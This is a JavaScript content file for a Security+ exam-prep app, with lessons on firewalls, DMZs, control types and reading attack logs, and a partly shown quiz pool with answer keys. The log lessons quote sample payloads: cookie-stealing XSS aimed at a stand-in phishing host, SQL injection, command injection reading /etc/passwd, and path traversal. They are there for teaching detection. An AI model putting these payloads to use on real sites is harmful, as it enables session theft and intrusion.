"use strict";

/* ------------------------------------------------------------------ *
 * SY0-701 PBQ (Performance-Based Question) content pack.
 *
 * PBQ_DATA.lessons   -> guided lessons (rendered by pbq.js)
 * PBQ_DATA.questions -> 5-question-test pool (same shape as the
 *                        practice-exam pool, plus a `category` tag so
 *                        the learner can target a PBQ skill).
 *
 * Lesson "blocks" are a tiny content schema interpreted by pbq.js:
 *   { type: "p",     text }                      paragraph
 *   { type: "h",     text }                      sub-heading
 *   { type: "list",  ordered?, items[] }         bullet / numbered list
 *   { type: "steps", items[] }                   numbered "flow" steps
 *   { type: "callout", variant, title, text }    tip | warn | key | note
 *   { type: "keys",  items[] }                    "key takeaways" block
 *   { type: "table", head[], rows[][], caption? } data table
 *   { type: "log",   intro?, lines[] }            log viewer w/ highlights
 *   { type: "diagram", title?, html }            authored HTML diagram
 *
 * Diagram/log HTML is authored here (never user input) so rendering it
 * as innerHTML is safe.
 * ------------------------------------------------------------------ */

const PBQ_DATA = {
  /* =============================== LESSONS =============================== */
  lessons: [
    /* ---------------------------------------------------------------- 0 */
    {
      id: "intro",
      eyebrow: "Start here",
      title: "What PBQs Are & How to Beat Them",
      minutes: 5,
      summary:
        "The mindset, scoring, and a repeatable attack plan for every Security+ performance-based question.",
      blocks: [
        {
          type: "p",
          text: "Performance-Based Questions (PBQs) are the interactive tasks at the start of the SY0-701 exam: build a firewall ruleset, drag controls into the right category, read a network diagram, or pick the malicious lines out of a log. They are worth more than a single multiple-choice item and they scare people because they look like 'real work' instead of trivia.",
        },
        {
          type: "p",
          text: "Here is the secret: a PBQ is just a multiple-choice question wearing a costume. Every PBQ has a small, finite set of correct choices. Your job is to translate the scenario into 'what is being asked' and then apply one rule at a time.",
        },
        {
          type: "callout",
          variant: "key",
          title: "Partial credit is real",
          text: "Most PBQs are scored per sub-answer. If a firewall PBQ wants 4 rules and you get 3 right, you still earn 3/4. Never leave a PBQ blank, and never let one PBQ eat your clock.",
        },
        { type: "h", text: "A repeatable 5-step attack plan" },
        {
          type: "steps",
          items: [
            "Read the LAST sentence first. It tells you exactly what to produce (e.g. 'configure the firewall so the web server can reach the database').",
            "Identify the question TYPE: control matching, network/firewall flow, or log/attack identification. Each type has its own playbook (the next lessons).",
            "Inventory the givens. List the devices, zones, ports, IPs, or log lines you were handed before you touch anything.",
            "Apply ONE rule at a time and check it against the requirement. Don't solve the whole board in your head.",
            "Sweep for the implicit answer: the deny-all rule, the 'no attack' option, the control that fits the LEFT-OVER slot. PBQs love the cleanup answer.",
          ],
        },
        {
          type: "callout",
          variant: "tip",
          title: "Flag and move",
          text: "You can flag a PBQ and return to it. If you're stuck after ~2 minutes, lock in your best partial answer, flag it, and go bank the easy multiple-choice points. Come back with a calmer head.",
        },
        {
          type: "keys",
          items: [
            "PBQs = multiple-choice with extra steps; there is always a finite right answer.",
            "Partial credit means a blank PBQ is the only truly wrong answer.",
            "Classify the PBQ type first, then run that type's playbook.",
            "Read the requirement sentence before the scenario noise.",
          ],
        },
      ],
    },

    /* ---------------------------------------------------------------- 1 */
    {
      id: "topology",
      eyebrow: "Network PBQs",
      title: "Reading a Network Topology Diagram",
      minutes: 9,
      summary:
        "Learn the zones, the symbols, and exactly where every security device sits so the diagram reads like a map instead of a maze.",
      blocks: [
        {
          type: "p",
          text: "Network diagram PBQs drop you in front of boxes, lines, and a cloud, then ask things like 'where should the IDS go?' or 'which device inspects traffic from the Internet to the web server?'. You cannot answer until you can name the zones and read the direction of the lines.",
        },
        { type: "h", text: "The three zones, from least to most trusted" },
        {
          type: "table",
          head: ["Zone", "Trust", "What lives here", "Reaches"],
          rows: [
            ["Internet / WAN (the cloud)", "Untrusted", "Anonymous users, attackers, the public", "Only what the perimeter firewall allows"],
            ["DMZ / Screened subnet", "Semi-trusted", "Public-facing servers: web, mail, reverse proxy, DNS", "Internet inbound on specific ports; limited paths inward"],
            ["Internal LAN / Intranet", "Trusted", "Workstations, databases, domain controllers, file servers", "Out to Internet; inward DB only from the DMZ app tier"],
          ],
        },
        {
          type: "callout",
          variant: "key",
          title: "The golden rule of the DMZ",
          text: "A public server (web, mail) belongs in the DMZ — NEVER on the internal LAN. The whole point is: if the public box gets popped, the attacker is still stuck behind a second firewall, away from your real data.",
        },
        { type: "h", text: "A diagram you can actually read" },
        {
          type: "diagram",
          title: "Classic screened-subnet (DMZ) layout",
          html:
            '<div class="topo">' +
            '<div class="topo-row">' +
            '<div class="topo-node node-cloud">Internet<small>untrusted</small></div>' +
            '<div class="topo-link">→</div>' +
            '<div class="topo-node node-fw">Edge<br>Firewall<small>perimeter</small></div>' +
            '<div class="topo-link">→</div>' +
            '<div class="topo-zone dmz"><span class="zone-tag">DMZ / Screened Subnet</span>' +
            '<div class="topo-node node-srv">Reverse&nbsp;Proxy<small>:443</small></div>' +
            '<div class="topo-node node-srv">Web&nbsp;Server<small>:443</small></div>' +
            '</div>' +
            '<div class="topo-link">→</div>' +
            '<div class="topo-node node-fw">Internal<br>Firewall</div>' +
            '<div class="topo-link">→</div>' +
            '<div class="topo-zone lan"><span class="zone-tag">Internal LAN</span>' +
            '<div class="topo-node node-srv">App&nbsp;Server</div>' +
            '<div class="topo-node node-db">Database<small>:3306</small></div>' +
            '<div class="topo-node node-pc">Workstations</div>' +
            '</div>' +
            '</div>' +
            '<p class="topo-caption">Traffic gets <strong>less trusted on the left, more trusted on the right.</strong> Every arrow crosses a firewall, and every crossing is a place rules are enforced.</p>' +
            '</div>',
        },
        { type: "h", text: "Where each security device belongs" },
        {
          type: "table",
          head: ["Device", "Job", "Where it sits"],
          rows: [
            ["Firewall", "Allow/deny by rule (IP, port, protocol)", "At every zone boundary (edge + internal)"],
            ["Reverse proxy / WAF", "Front public web apps, filter HTTP attacks", "In the DMZ, in front of web servers"],
            ["IDS", "Detect & alert on bad traffic (passive copy)", "On a span/tap watching a segment — out of band"],
            ["IPS", "Detect AND block bad traffic (inline)", "Inline, usually just inside the edge firewall"],
            ["Load balancer", "Spread traffic across servers", "In front of a server pool (often DMZ)"],
            ["Jump box / bastion", "Single audited entry to admin internal hosts", "Bridges a management path into the LAN"],
            ["Proxy (forward)", "Filter & log users going OUT to the Internet", "At the LAN egress toward the edge"],
          ],
        },
        {
          type: "callout",
          variant: "tip",
          title: "IDS vs IPS — the exam's favorite trap",
          text: "IDS is OUT-OF-BAND and only alerts (a security camera). IPS is INLINE and can drop the packet (a security guard). If the question says 'detect only' or 'no impact on traffic', it's an IDS. If it says 'stop/block', it's an IPS.",
        },
        {
          type: "keys",
          items: [
            "Trust increases as you move from Internet → DMZ → Internal LAN.",
            "Public servers go in the DMZ, behind the edge firewall, in front of the internal firewall.",
            "Each arrow that crosses a zone boundary is a firewall enforcement point.",
            "IDS = passive/alert/out-of-band; IPS = inline/block.",
          ],
        },
      ],
    },

    /* ---------------------------------------------------------------- 2 */
    {
      id: "flow",
      eyebrow: "Network PBQs",
      title: "How Traffic Flows Through Firewall Rules",
      minutes: 10,
      summary:
        "Top-down, first-match-wins, implicit deny at the bottom. Trace a packet through a ruleset the way the firewall actually does.",
      blocks: [
        {
          type: "p",
          text: "A firewall ruleset is a checklist the firewall walks from TOP to BOTTOM for every packet. It stops at the FIRST rule that matches and does whatever that rule says. Nothing below a matching rule is ever read for that packet. This single fact answers most firewall PBQs.",
        },
        {
          type: "callout",
          variant: "key",
          title: "The four laws of rule processing",
          text: "1) Rules are read top to bottom.  2) First match wins — evaluation stops there.  3) Order matters: a broad ALLOW above a specific DENY makes the DENY useless.  4) If nothing matches, the implicit DENY ALL at the bottom drops it.",
        },
        { type: "h", text: "Anatomy of a rule" },
        {
          type: "table",
          head: ["Field", "Means", "Example"],
          rows: [
            ["Source", "Who is sending", "10.0.10.0/24 (the DMZ web subnet)"],
            ["Destination", "Who they're trying to reach", "10.0.20.50 (the database)"],
            ["Port / Service", "Which application", "3306 (MySQL), 443 (HTTPS), 22 (SSH)"],
            ["Protocol", "TCP / UDP / ICMP", "TCP"],
            ["Action", "Permit or Deny", "ALLOW"],
          ],
        },
        { type: "h", text: "Trace a packet: web server → database" },
        {
          type: "p",
          text: "Requirement: the DMZ web server (10.0.10.10) must query the internal database (10.0.20.50) on port 3306, but nothing else from the DMZ should reach the LAN. Walk the ruleset:",
        },
        {
          type: "table",
          caption: "Internal firewall ruleset (read top-down)",
          head: ["#", "Source", "Destination", "Port", "Action", "Result for our packet"],
          rows: [
            ["1", "10.0.10.10", "10.0.20.50", "3306", "ALLOW", "MATCH → permitted. Stop here."],
            ["2", "10.0.10.0/24", "10.0.20.0/24", "ANY", "DENY", "Never reached for this packet"],
            ["3", "ANY", "ANY", "ANY", "DENY", "Implicit deny-all backstop"],
          ],
        },
        {
          type: "callout",
          variant: "warn",
          title: "Order is everything",
          text: "Flip rules 1 and 2 and the web server can no longer reach the database — the broad DENY on row 1 would match first and drop it. When a PBQ says 'the connection still fails', suspect a too-broad rule sitting ABOVE your allow rule.",
        },
        { type: "h", text: "Direction: ingress vs egress" },
        {
          type: "list",
          items: [
            "Ingress = traffic coming INTO a zone (Internet → DMZ). Lock this down hard; only open the exact ports a public service needs (e.g. 443).",
            "Egress = traffic leaving a zone (LAN → Internet). Filter this too — egress rules catch malware calling home (C2) and data exfiltration.",
            "Stateful firewalls auto-allow the RETURN traffic of a connection you permitted, so you only write the rule for the initiating direction.",
          ],
        },
        { type: "h", text: "Ports you must recognize on sight" },
        {
          type: "table",
          head: ["Port", "Service", "Port", "Service"],
          rows: [
            ["22", "SSH (secure admin)", "443", "HTTPS"],
            ["80", "HTTP", "445", "SMB (file sharing)"],
            ["53", "DNS", "3306", "MySQL database"],
            ["3389", "RDP (remote desktop)", "1433", "MS SQL database"],
            ["25 / 587", "SMTP (email send)", "636", "LDAPS (secure directory)"],
          ],
        },
        {
          type: "keys",
          items: [
            "Firewalls read top-down and stop at the first match.",
            "A broad ALLOW or DENY placed too high overrides the specific rules below it.",
            "There is always an implicit DENY ALL at the bottom — anything not permitted is dropped.",
            "Write rules for the initiating direction; stateful firewalls handle the return.",
            "Memorize the common ports — PBQs assume you know them cold.",
          ],
        },
      ],
    },

    /* ---------------------------------------------------------------- 3 */
    {
      id: "firewall-build",
      eyebrow: "Network PBQs",
      title: "Building a Firewall Ruleset (Worked PBQ)",
      minutes: 8,
      summary:
        "A full firewall-configuration PBQ solved rule by rule, the way the exam wants you to think.",
      blocks: [
        {
          type: "p",
          text: "This is the most common network PBQ: you're given a topology and a list of requirements, and you must order ALLOW/DENY rules correctly. Let's solve one end to end.",
        },
        {
          type: "callout",
          variant: "note",
          title: "Scenario",
          text: "Internet users must reach the DMZ web server on HTTPS. The web server must query the internal DB on 3306. Admins on the LAN must SSH to the web server. Everything else between zones is denied.",
        },
        {
          type: "diagram",
          title: "Addresses in play",
          html:
            '<div class="topo compact">' +
            '<div class="topo-row">' +
            '<div class="topo-node node-cloud">Internet<small>ANY</small></div>' +
            '<div class="topo-link">→</div>' +
            '<div class="topo-node node-srv">Web (DMZ)<small>10.0.10.10</small></div>' +
            '<div class="topo-link">→</div>' +
            '<div class="topo-node node-db">DB (LAN)<small>10.0.20.50</small></div>' +
            '</div>' +
            '<p class="topo-caption">Admin subnet (LAN): 10.0.30.0/24 · SSH = port 22 · HTTPS = 443 · MySQL = 3306</p>' +
            '</div>',
        },
        { type: "h", text: "Translate each requirement into one rule" },
        {
          type: "table",
          caption: "Final ruleset — specific ALLOWs first, deny-all last",
          head: ["#", "Source", "Destination", "Port", "Action", "Satisfies"],
          rows: [
            ["1", "ANY", "10.0.10.10", "443", "ALLOW", "Internet → web on HTTPS"],
            ["2", "10.0.10.10", "10.0.20.50", "3306", "ALLOW", "Web → DB query"],
            ["3", "10.0.30.0/24", "10.0.10.10", "22", "ALLOW", "Admins → web over SSH"],
            ["4", "ANY", "ANY", "ANY", "DENY", "Implicit deny — block the rest"],
          ],
        },
        {
          type: "callout",
          variant: "tip",
          title: "Why this order works",
          text: "Each ALLOW is as SPECIFIC as possible (exact host + exact port) and sits ABOVE the catch-all DENY. Because the deny-all is last, it only fires for traffic no earlier rule permitted — exactly 'everything else is denied'.",
        },
        {
          type: "callout",
          variant: "warn",
          title: "Common PBQ mistakes",
          text: "Putting the DENY ALL at the top (blocks everything), opening port 80 instead of 443, allowing ANY→ANY on a port (too broad), or pointing the DB rule at the wrong direction (DB→web instead of web→DB).",
        },
        {
          type: "keys",
          items: [
            "One requirement → one specific rule.",
            "Specific ALLOW rules go on top; the catch-all DENY goes last.",
            "Match the exact host, exact port, and correct direction every time.",
            "Least privilege: never widen a rule to ANY unless the requirement truly is 'anyone'.",
          ],
        },
      ],
    },

    /* ---------------------------------------------------------------- 4 */
    {
      id: "log-fieldguide",
      eyebrow: "Log PBQs",
      title: "Identifying Attacks From Logs — Field Guide",
      minutes: 12,
      summary:
        "The tell-tale signature of every attack type on the SY0-701 dropdown, so you can name it from a log line in seconds.",
      blocks: [
        {
          type: "p",
          text: "Log-analysis PBQs show you 10–15 entries and ask two things: (1) which lines are malicious, and (2) what is the attack called. You don't read logs left to right — you SCAN for signatures. Here is the cheat sheet for every option the exam puts in that dropdown.",
        },
        {
          type: "table",
          caption: "Attack signatures you can spot in a log",
          head: ["Attack", "What you SEE in the log"],
          rows: [
            ["SQL Injection", "' OR 1=1 -- , UNION SELECT, ; DROP TABLE, quotes/comments in a parameter (id=8901' OR ...)"],
            ["Cross-Site Scripting (XSS)", "<script>, javascript:, onerror=, document.cookie, <object>/<base>/<style> with code in a text/comment field"],
            ["Command Injection", "Shell metacharacters in a parameter: ; | && `, with whoami, cat /etc/passwd, ping, /bin/sh"],
            ["Directory Traversal", "../../ or ..%2f sequences, /etc/passwd, c:\\windows\\system32, reaching files OUTSIDE the web root"],
            ["Brute Force", "MANY failed logins for ONE account in seconds, sequential password guesses, then a success"],
            ["Password Spraying", "ONE or two common passwords tried against MANY different usernames (low-and-slow, avoids lockout)"],
            ["DDoS", "A flood of requests from MANY source IPs at once; huge request volume, resource exhaustion"],
            ["Privilege Escalation", "A normal user suddenly hitting admin URLs, sudo, role=admin, or gaining rights they shouldn't have"],
            ["On-Path (MITM)", "ARP/DNS anomalies, certificate warnings, traffic redirected through an unexpected host"],
            ["DNS Attack", "Unexpected DNS responses, cache poisoning, an internal name resolving to an attacker IP, tunneling over port 53"],
            ["Buffer Overflow", "Absurdly long input strings, AAAAAA... padding, hex shellcode (\\x90 NOP sled), a crash/segfault"],
          ],
        },
        {
          type: "callout",
          variant: "key",
          title: "Three questions that crack any log PBQ",
          text: "1) WHERE is the weird data — in a URL parameter, a header, a form field? 2) WHAT does the payload try to DO — read a file, run code, dump a table, redirect a browser? 3) Is the volume/pattern abnormal — one IP hammering, or one password across many users?",
        },
        { type: "h", text: "Injection vs scripting — don't mix them up" },
        {
          type: "list",
          items: [
            "SQL injection targets the DATABASE. Look for SQL keywords and quote/comment tricks in a parameter.",
            "Command injection targets the OPERATING SYSTEM/shell. Look for ; | && and OS commands like whoami.",
            "XSS targets OTHER USERS' BROWSERS. Look for HTML/JS that runs in a victim's session and steals cookies or redirects them.",
            "Directory traversal targets the FILE SYSTEM. Look for ../ climbing out of the web root toward /etc/passwd.",
          ],
        },
        { type: "h", text: "Failed-login patterns: brute force vs spraying" },
        {
          type: "log",
          intro: "Brute force = many guesses, ONE account:",
          lines: [
            { meta: "10.0.0.9", text: 'login user="admin" FAILED (1)', bad: true },
            { meta: "10.0.0.9", text: 'login user="admin" FAILED (2)', bad: true },
            { meta: "10.0.0.9", text: 'login user="admin" FAILED (3)', bad: true },
            { meta: "10.0.0.9", text: 'login user="admin" SUCCESS', bad: true },
          ],
        },
        {
          type: "log",
          intro: "Password spraying = ONE password, MANY accounts (stays under lockout limits):",
          lines: [
            { meta: "45.8.8.8", text: 'login user="jsmith"  pass="Spring2025!" FAILED', bad: true },
            { meta: "45.8.8.8", text: 'login user="mjones"  pass="Spring2025!" FAILED', bad: true },
            { meta: "45.8.8.8", text: 'login user="kpatel"  pass="Spring2025!" SUCCESS', bad: true },
          ],
        },
        {
          type: "keys",
          items: [
            "Scan for signatures; don't read every byte.",
            "Match the payload's TARGET to the attack: DB→SQLi, shell→command injection, browser→XSS, files→traversal.",
            "Many guesses on one account = brute force; one password across many accounts = spraying.",
            "Many source IPs flooding a service = DDoS.",
          ],
        },
      ],
    },

    /* ---------------------------------------------------------------- 5 */
    {
      id: "xss-walkthrough",
      eyebrow: "Log PBQs",
      title: "Worked PBQ: The E-commerce Review Log (XSS)",
      minutes: 9,
      summary:
        "The exact log-analysis PBQ from your screenshot, decoded line by line — which entries are malicious and why the answer is XSS.",
      blocks: [
        {
          type: "p",
          text: "The task: review an e-commerce product-review system's web log, select the malicious lines, then pick the attack type from the dropdown. All requests come from one IP (45.78.90.123) and return 200. Most are ordinary shopping traffic — but three lines hide payloads in user-supplied text fields.",
        },
        {
          type: "log",
          intro: "The log (suspicious lines highlighted):",
          lines: [
            { meta: "20:12:34", text: 'GET /shop.php 200', bad: false },
            { meta: "20:12:51", text: 'GET /product.php?id=8901 200', bad: false },
            { meta: "20:13:08", text: 'POST /review.php?text=<object data="data:text/html,<script>window.location=\'https://phishing.xyz\'+document.cookie</script>"> 200', bad: true },
            { meta: "20:13:25", text: 'GET /cart.php 200', bad: false },
            { meta: "20:13:42", text: 'GET /wishlist.php 200', bad: false },
            { meta: "20:13:59", text: 'GET /deals.php 200', bad: false },
            { meta: "20:14:16", text: "POST /qa.php?question=<style>@import'javascript:eval(String.fromCharCode(97,108,101,114,116,40,...))'</style> 200", bad: true },
            { meta: "20:14:33", text: 'GET /compare.php 200', bad: false },
            { meta: "20:14:50", text: 'GET /shipping.php 200', bad: false },
            { meta: "20:15:07", text: 'GET /returns.php 200', bad: false },
            { meta: "20:15:24", text: 'POST /subscribe.php?email=<base href="javascript:evil.com/%250Aalert(document.cookie)//"> 200', bad: true },
            { meta: "20:15:41", text: 'GET /logout.php 302', bad: false },
          ],
        },
        { type: "h", text: "Why those three lines are malicious" },
        {
          type: "list",
          items: [
            "20:13:08 /review.php — the review TEXT contains an <object> loading a data:text/html script that runs window.location='https://phishing.xyz'+document.cookie. It redirects every viewer of the review to a phishing site and appends their session cookie. Cookie theft via stored XSS.",
            "20:14:16 /qa.php — the question field hides a <style>@import 'javascript:...'</style> that evals String.fromCharCode(...). Decode the char codes and you get alert(document.cookie). Script smuggled through CSS — still XSS.",
            "20:15:24 /subscribe.php — the email field injects a <base href=\"javascript:...\"> tag. A malicious <base> hijacks how the page resolves links/scripts to run attacker code. Again, XSS.",
          ],
        },
        {
          type: "callout",
          variant: "key",
          title: "The deciding signal",
          text: "Every payload is HTML/JavaScript (<script>, <object>, <style>, <base>, javascript:, document.cookie) planted in a field meant for human text (a review, a Q&A post, an email). Code that runs in OTHER users' browsers to steal cookies or redirect them = Cross-Site Scripting (XSS).",
        },
        { type: "h", text: "Why it ISN'T the other tempting choices" },
        {
          type: "table",
          head: ["Ruled out", "Because"],
          rows: [
            ["SQL Injection", "No SQL keywords, quotes-to-break-a-query, UNION, or DROP. The payloads target browsers, not the database."],
            ["Command Injection", "No shell metacharacters (; | &&) or OS commands (whoami, /bin/sh). Nothing tries to run on the server's shell."],
            ["Directory Traversal", "No ../ sequences and no attempt to read files like /etc/passwd outside the web root."],
            ["No Attack Suspected", "Three entries clearly carry executable browser payloads — there is absolutely an attack."],
          ],
        },
        {
          type: "callout",
          variant: "tip",
          title: "PBQ technique you just used",
          text: "The 'all 200, all one IP' detail is a distractor. Status codes and source IP didn't decide this — the CONTENT of the user-supplied fields did. Always inspect what's inside the parameters.",
        },
        {
          type: "keys",
          items: [
            "Malicious lines: 20:13:08, 20:14:16, 20:15:24. Attack: Cross-Site Scripting (XSS).",
            "XSS = attacker HTML/JS stored in a text field that runs in another user's browser.",
            "document.cookie + redirect/alert = the classic XSS goal (session theft).",
            "Eliminate SQLi/command injection/traversal by checking what the payload actually targets.",
          ],
        },
      ],
    },

    /* ---------------------------------------------------------------- 6 */
    {
      id: "controls",
      eyebrow: "Control PBQs",
      title: "Security Control Types & Functions",
      minutes: 8,
      summary:
        "The drag-and-drop matrix PBQ: sort controls by CATEGORY (how it's implemented) and FUNCTION (what it does).",
      blocks: [
        {
          type: "p",
          text: "Control-matching PBQs give you a pile of controls (firewall, security guard, backups, policy, warning sign...) and ask you to drop each into the right box. SY0-701 sorts controls two different ways at once — get both axes straight and these become free points.",
        },
        { type: "h", text: "Axis 1 — Control CATEGORY (how it's implemented)" },
        {
          type: "table",
          head: ["Category", "Meaning", "Examples"],
          rows: [
            ["Technical", "Technology enforces it", "Firewall, encryption, IPS, MFA, antivirus"],
            ["Managerial", "Management / process / paperwork", "Risk assessments, policies, security planning"],
            ["Operational", "People carry it out day-to-day", "Security awareness training, guards, incident response"],
            ["Physical", "Touch it in the real world", "Locks, fences, bollards, badge readers, cameras"],
          ],
        },
        { type: "h", text: "Axis 2 — Control FUNCTION (what it does)" },
        {
          type: "table",
          head: ["Function", "Meaning", "Examples"],
          rows: [
            ["Preventive", "Stops it before it happens", "Firewall rule, lock, MFA, training"],
            ["Detective", "Spots it while/after it happens", "IDS, log monitoring, CCTV review, audits"],
            ["Deterrent", "Discourages the attempt", "Warning sign, visible camera, guard dog"],
            ["Corrective", "Fixes/restores after the fact", "Backups & restore, patching, IPS dropping a session"],
            ["Compensating", "Stand-in when the primary can't be used", "A temporary jump box instead of full segmentation"],
            ["Directive", "Tells people what to do", "Policy, procedure, acceptable-use agreement"],
          ],
        },
        {
          type: "callout",
          variant: "key",
          title: "Same control, two answers",
          text: "A single control has BOTH a category and a function. A firewall is Technical (category) AND Preventive (function). A CCTV camera is Physical + Detective (recording) but also Deterrent (visible). Read which axis the PBQ box is asking for.",
        },
        {
          type: "callout",
          variant: "warn",
          title: "The classic trip-ups",
          text: "A camera DETECTS (review the footage) and DETERS (people see it) but does NOT PREVENT a break-in. A guard can deter, detect, and prevent. Backups are CORRECTIVE, not preventive. A policy is Managerial/Directive, not Technical.",
        },
        {
          type: "keys",
          items: [
            "Category = HOW it's built: Technical, Managerial, Operational, Physical.",
            "Function = WHAT it does: Preventive, Detective, Deterrent, Corrective, Compensating, Directive.",
            "Every control has one of each — answer the axis the box asks for.",
            "Backups = corrective; cameras = detective+deterrent; policies = managerial/directive.",
          ],
        },
      ],
    },
  ],

  /* ============================== TEST POOL ============================= */
  /* category: "network" | "logs" | "controls"  (used by the test filter) */
  questions: [
    /* ---------------------------- NETWORK ---------------------------- */
    {
      category: "network",
      topic: "Network Flow",
      number: 1,
      question:
        "A firewall processes its ruleset and the web server can no longer reach the database, even though an explicit ALLOW rule for that traffic exists. Which is the MOST likely cause?",
      options: {
        A: "A broader DENY rule is placed ABOVE the specific ALLOW rule",
        B: "The implicit deny-all rule was removed",
        C: "The firewall is stateful instead of stateless",
        D: "Port 443 is closed",
      },
      correct: ["A"],
      explanation:
        "Firewalls read top-down and stop at the first match. If a broad DENY sits above the specific ALLOW, the DENY matches first and the packet is dropped before the ALLOW is ever read. Reorder so specific ALLOW rules come before broad DENY rules.",
    },
    {
      category: "network",
      topic: "Rule Order",
      number: 2,
      question:
        "Where in a firewall ruleset should the 'deny any/any' rule be placed?",
      options: {
        A: "At the very top so it is evaluated first",
        B: "At the very bottom, after all specific allow rules",
        C: "It does not matter where it goes",
        D: "Immediately after the first allow rule",
      },
      correct: ["B"],
      explanation:
        "The catch-all deny belongs LAST. Because evaluation stops at the first match, a deny-all at the top would block everything. At the bottom it only fires for traffic that no earlier ALLOW permitted — which is exactly the 'everything else is denied' requirement (least privilege).",
    },
    {
      category: "network",
      topic: "DMZ Placement",
      number: 3,
      question:
        "A company is deploying a public-facing web server. According to defense-in-depth, where should it be placed?",
      options: {
        A: "On the internal LAN with the workstations",
        B: "In the DMZ / screened subnet",
        C: "Directly on the Internet with no firewall",
        D: "On the same subnet as the domain controller",
      },
      correct: ["B"],
      explanation:
        "Public servers go in the DMZ (screened subnet) — behind the edge firewall but separated from the trusted LAN by an internal firewall. If the public box is compromised, the attacker is still blocked from reaching internal data, which would not be true if it sat on the LAN.",
    },
    {
      category: "network",
      topic: "Device Placement",
      number: 4,
      question:
        "Management wants a sensor that can DETECT and actively BLOCK malicious traffic in real time as it enters the network. Which device, and how is it deployed?",
      options: {
        A: "An IDS deployed out-of-band on a span port",
        B: "An IPS deployed inline",
        C: "A forward proxy at the LAN egress",
        D: "A load balancer in front of the server pool",
      },
      correct: ["B"],
      explanation:
        "Blocking in real time requires an INLINE device that sits in the traffic path — that is an IPS. An IDS is out-of-band (it only sees a copy) and can alert but not drop packets. The 'detect AND block' requirement is the tell for IPS.",
    },
    {
      category: "network",
      topic: "Ports",
      number: 5,
      question:
        "To allow Internet users to securely browse a web server while blocking cleartext web traffic, which port should be permitted inbound? (Choose the single best answer.)",
      options: {
        A: "Port 80",
        B: "Port 22",
        C: "Port 443",
        D: "Port 3389",
      },
      correct: ["C"],
      explanation:
        "443 is HTTPS (encrypted web). 80 is cleartext HTTP and should stay closed when secure browsing is required. 22 is SSH and 3389 is RDP — neither is for public web browsing.",
    },
    {
      category: "network",
      topic: "Egress Filtering",
      number: 6,
      question:
        "Why do well-configured networks filter EGRESS (outbound) traffic in addition to ingress?",
      options: {
        A: "Egress filtering speeds up internal traffic",
        B: "To catch malware command-and-control callbacks and data exfiltration leaving the network",
        C: "Stateful firewalls require it to function",
        D: "It is only needed for the DMZ",
      },
      correct: ["B"],
      explanation:
        "Ingress rules stop attackers getting in; egress rules stop bad traffic getting OUT — blocking infected hosts from reaching their command-and-control servers and stopping sensitive data from being exfiltrated. Defense in depth filters both directions.",
    },
    {
      category: "network",
      topic: "Segmentation",
      number: 7,
      question:
        "A diagram shows workstations, a database, and a domain controller all on one flat subnet with the web server. Which TWO improvements address the biggest risks? (Choose two.)",
      options: {
        A: "Move the web server into a DMZ",
        B: "Place an internal firewall to segment servers from workstations",
        C: "Open port 80 to the Internet",
        D: "Remove the implicit deny-all rule",
        E: "Disable all logging to reduce noise",
      },
      correct: ["A", "B"],
      explanation:
        "A flat network lets one compromised host reach everything. Moving the public web server to a DMZ and adding an internal firewall to segment servers from user workstations both limit lateral movement (east-west traffic). The other options weaken security.",
    },
    {
      category: "network",
      topic: "Traffic Tracing",
      number: 8,
      question:
        "A stateful firewall has a rule allowing the DMZ web server to initiate connections to the internal DB on 3306. Do you also need a rule allowing the DB's reply traffic back to the web server?",
      options: {
        A: "Yes — you must add an explicit return rule",
        B: "No — a stateful firewall automatically permits the return traffic of an allowed connection",
        C: "Yes, but only on port 80",
        D: "No, because databases never reply",
      },
      correct: ["B"],
      explanation:
        "Stateful firewalls track established connections and automatically allow the return packets of a session you permitted. You only write a rule for the INITIATING direction (web → DB on 3306); the reply is handled by the state table.",
    },

    /* ----------------------------- LOGS ------------------------------ */
    {
      category: "logs",
      topic: "Attack ID",
      number: 9,
      question:
        "A web log shows reviews and comments containing <script>, <object>, and javascript: payloads that reference document.cookie. What attack is this?",
      options: {
        A: "SQL Injection",
        B: "Cross-Site Scripting (XSS)",
        C: "Command Injection",
        D: "Directory Traversal",
      },
      correct: ["B"],
      explanation:
        "HTML/JavaScript planted in user text fields that runs in other users' browsers (especially anything touching document.cookie) is Cross-Site Scripting. The payload targets browsers/sessions, not the database (SQLi), the shell (command injection), or the file system (traversal).",
    },
    {
      category: "logs",
      topic: "Attack ID",
      number: 10,
      question:
        'A parameter in the log reads: id=8901\' OR \'1\'=\'1\' -- . Which attack does this indicate?',
      options: {
        A: "Cross-Site Scripting",
        B: "Buffer Overflow",
        C: "SQL Injection",
        D: "DNS Poisoning",
      },
      correct: ["C"],
      explanation:
        "A single quote to break out of the query, a tautology (OR '1'='1'), and a -- comment to ignore the rest are textbook SQL injection. The attacker is manipulating the database query, not a browser or the OS shell.",
    },
    {
      category: "logs",
      topic: "Attack ID",
      number: 11,
      question:
        "Which log signature points to COMMAND INJECTION rather than SQL injection?",
      options: {
        A: "UNION SELECT username,password FROM users",
        B: "; cat /etc/passwd  or  | whoami appended to a parameter",
        C: "<img src=x onerror=alert(1)>",
        D: "../../../../etc/passwd",
      },
      correct: ["B"],
      explanation:
        "Command injection abuses the OS shell, so you see shell metacharacters (; | && `) and operating-system commands like whoami or cat /etc/passwd. UNION SELECT is SQLi, the onerror payload is XSS, and ../../ is directory traversal.",
    },
    {
      category: "logs",
      topic: "Attack ID",
      number: 12,
      question:
        "A request contains GET /download?file=../../../../etc/passwd. What attack is being attempted?",
      options: {
        A: "Directory Traversal",
        B: "Privilege Escalation",
        C: "Password Spraying",
        D: "On-Path Attack",
      },
      correct: ["A"],
      explanation:
        "The ../ sequences climb out of the web root to reach a file the app never intended to serve (/etc/passwd). Reaching files outside the intended directory using ../ (or ..%2f) is directory/path traversal.",
    },
    {
      category: "logs",
      topic: "Auth Patterns",
      number: 13,
      question:
        "Logs show one source IP attempting hundreds of failed logins against the single account 'administrator' in under a minute, followed by a success. What is this?",
      options: {
        A: "Password Spraying",
        B: "Brute Force Attack",
        C: "DDoS",
        D: "Privilege Escalation",
      },
      correct: ["B"],
      explanation:
        "Many rapid password guesses against ONE account is a brute-force attack. Contrast with password spraying, which tries ONE common password across MANY accounts to stay under lockout thresholds.",
    },
    {
      category: "logs",
      topic: "Auth Patterns",
      number: 14,
      question:
        "Authentication logs show the password 'Summer2025!' tried once each against 200 different usernames from one host. Which attack is this?",
      options: {
        A: "Brute Force Attack",
        B: "Password Spraying",
        C: "Buffer Overflow",
        D: "Credential Stuffing of a single account",
      },
      correct: ["B"],
      explanation:
        "One common password sprayed across many accounts (one attempt each) is password spraying. The low attempts-per-account pattern is designed to avoid triggering account-lockout, which a noisy brute-force attack on a single account would trip.",
    },
    {
      category: "logs",
